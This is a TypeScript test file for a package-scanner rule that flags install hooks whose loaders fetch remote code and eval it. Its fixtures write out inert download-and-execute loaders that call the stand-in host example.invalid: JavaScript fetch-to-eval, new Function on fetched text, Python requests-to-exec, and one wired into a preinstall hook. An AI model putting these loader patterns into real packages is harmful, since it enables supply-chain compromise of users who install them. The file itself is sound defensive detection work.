/**
 * Incident validation 2026-10-22 (zod supply chain reconstruction):
 * an install script whose referenced local loader fetches remote
 * code and evaluates it drew no download-and-execute finding on
 * 0.1.16 and the estate verdicted REVIEW instead of
 * COMPROMISED-PATTERN.
 *
 * The zod loader shape is variable mediated: the fetch result is
 * bound to a variable, its text is bound to a second variable, and
 * that variable is handed to eval. The existing DOWNLOAD-EXEC
 * detector covers only inline code (node -e, python -c) whose
 * literal content references the network, and the REMOTE-EVAL
 * pattern covers only eval text that names curl, wget, or fetch
 * within a short forward window, so neither fires when the fetched
 * content reaches eval through variables in a referenced file.
 *
 * The fix is a value flow detector in the repo style of the
 * ENV-EXFIL analysis: a variable derived from a network fetch
 * (directly, or through a response body read such as .text()) that
 * reaches an eval style call (eval, Function, vm runIn context, or
 * Python exec) is download-and-execute. The same detector fires on
 * a fetch call written directly inside the eval argument.
 *
 * Controls that must not fire: a fetch whose result is only logged
 * or parsed as data, an eval of a constant or of a variable that is
 * not derived from a fetch, a comment only loader stub that names
 * the shape in prose, and a first party webhook POST with no eval.
 */
import { describe, it, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { classifyCommand, scanHooks } from "../src/core.js";

const dirs: string[] = [];
function fx(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "hc-v0117-"));
  dirs.push(dir);
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, content);
  }
  return dir;
}
after(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

// The zod loader shape, inert form: delivery URL is the reserved
// example.invalid domain and the entry point is never invoked in
// the fixture. Reproduced here as static text for the classifier.
const ZOD_LOADER = [
  '"use strict";',
  'const DELIVERY_URL = "https://example.invalid/payload.js";',
  "async function fetchAndRun(url) {",
  "  const res = await fetch(url);",
  "  const code = await res.text();",
  "  return eval(code);",
  "}",
  "async function main() {",
  "  await fetchAndRun(DELIVERY_URL);",
  "}",
  "",
].join("\n");

describe("zod loader: fetch plus eval in a referenced file is download-and-execute", () => {
  it("classifyCommand on the loader content fires DOWNLOAD-EXEC and REMOTE-EVAL", () => {
    const c = classifyCommand(ZOD_LOADER, "js");
    assert.equal(c.classification, "RISKY", `classification ${c.classification}`);
    assert.ok(c.rules.includes("DOWNLOAD-EXEC"), `rules: ${c.rules.join(",")}`);
    assert.ok(c.rules.includes("REMOTE-EVAL"), `rules: ${c.rules.join(",")}`);
  });

  it("an install script whose referenced loader fetches and evals verdicts COMPROMISED-PATTERN with DOWNLOAD-EXEC", () => {
    const dir = fx({
      "package.json": JSON.stringify({ name: "zod-fixture", version: "3.0.0", scripts: { preinstall: "node loader.js" } }),
      "loader.js": ZOD_LOADER,
    });
    const r = scanHooks(dir);
    assert.equal(r.verdict, "COMPROMISED-PATTERN", `verdict ${r.verdict} findings ${JSON.stringify(r.findings.map((f) => [f.id, f.rules]))}`);
    const f = r.findings.find((x) => x.hook === "preinstall");
    assert.ok(f, "preinstall finding present");
    assert.ok(f.rules.includes("DOWNLOAD-EXEC"), `rules: ${f.rules.join(",")}`);
  });

  it("a fetch written directly inside the eval argument fires DOWNLOAD-EXEC", () => {
    const c = classifyCommand('eval(await (await fetch("https://example.invalid/x.js")).text());', "js");
    assert.ok(c.rules.includes("DOWNLOAD-EXEC"), `rules: ${c.rules.join(",")}`);
  });

  it("a Python loader that execs a requests response fires DOWNLOAD-EXEC", () => {
    const code = [
      "import requests",
      "code = requests.get('https://example.invalid/x.py').text",
      "exec(code)",
      "",
    ].join("\n");
    const c = classifyCommand(code, "python");
    assert.ok(c.rules.includes("DOWNLOAD-EXEC"), `rules: ${c.rules.join(",")}`);
  });

  it("the Function constructor handed a fetch derived variable fires DOWNLOAD-EXEC", () => {
    const code = [
      "const res = await fetch(url);",
      "const code = await res.text();",
      "const run = new Function(code);",
      "run();",
      "",
    ].join("\n");
    const c = classifyCommand(code, "js");
    assert.ok(c.rules.includes("DOWNLOAD-EXEC"), `rules: ${c.rules.join(",")}`);
  });
});

describe("download-and-execute controls: no fetch to eval flow, no finding", () => {
  it("a fetch whose result is only logged does not fire DOWNLOAD-EXEC or REMOTE-EVAL", () => {
    const code = [
      "const res = await fetch('https://example.invalid/data.json');",
      "const data = await res.json();",
      "console.log(data);",
      "",
    ].join("\n");
    const c = classifyCommand(code, "js");
    assert.ok(!c.rules.includes("DOWNLOAD-EXEC"), `rules: ${c.rules.join(",")}`);
    assert.ok(!c.rules.includes("REMOTE-EVAL"), `rules: ${c.rules.join(",")}`);
  });

  it("an eval of a constant expression does not fire DOWNLOAD-EXEC", () => {
    const c = classifyCommand('eval("1 + 1");', "js");
    assert.ok(!c.rules.includes("DOWNLOAD-EXEC"), `rules: ${c.rules.join(",")}`);
  });

  it("an eval of an unrelated variable next to an unrelated fetch does not fire DOWNLOAD-EXEC", () => {
    const code = [
      "const res = await fetch('https://example.invalid/data.json');",
      "const data = await res.json();",
      "console.log(data);",
      'const expr = "1 + 1";',
      "eval(expr);",
      "",
    ].join("\n");
    const c = classifyCommand(code, "js");
    assert.ok(!c.rules.includes("DOWNLOAD-EXEC"), `rules: ${c.rules.join(",")}`);
    assert.ok(!c.rules.includes("REMOTE-EVAL"), `rules: ${c.rules.join(",")}`);
  });

  it("a comment only loader stub does not fire DOWNLOAD-EXEC", () => {
    const code = [
      "// In the real incident this loader fetched a runtime and",
      "// evaluated the returned code with eval. This stub contains",
      "// no executable payload logic, only this description.",
      'export const INERT_ENDPOINT = "https://example.invalid/collect";',
      "",
    ].join("\n");
    const c = classifyCommand(code, "js");
    assert.ok(!c.rules.includes("DOWNLOAD-EXEC"), `rules: ${c.rules.join(",")}`);
    assert.ok(!c.rules.includes("REMOTE-EVAL"), `rules: ${c.rules.join(",")}`);
  });

  it("a benign referenced build script stays clean at scan level", () => {
    const dir = fx({
      "package.json": JSON.stringify({ name: "benign-fixture", version: "1.0.0", scripts: { preinstall: "node build.js" } }),
      "build.js": 'console.log("building benign fixture");\n',
    });
    const r = scanHooks(dir);
    assert.equal(r.verdict, "CLEAN", `verdict ${r.verdict}`);
  });

  it("a first party webhook POST with no eval does not fire DOWNLOAD-EXEC and does not verdict COMPROMISED-PATTERN", () => {
    const dir = fx({
      ".github/workflows/ci-status-notify.yml": [
        "name: CI Status Notify",
        "on: [push]",
        "jobs:",
        "  notify:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - name: Post build status to team Slack",
        "        env:",
        "          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}",
        "        run: |",
        '          curl -s -X POST -H "Content-Type: application/json" -d "{\\"text\\": \\"Build finished\\"}" "$SLACK_WEBHOOK_URL"',
        "",
      ].join("\n"),
    });
    const r = scanHooks(dir);
    assert.notEqual(r.verdict, "COMPROMISED-PATTERN", `verdict ${r.verdict}`);
    for (const f of r.findings) {
      assert.ok(!f.rules.includes("DOWNLOAD-EXEC"), `rules: ${f.rules.join(",")}`);
    }
  });
});
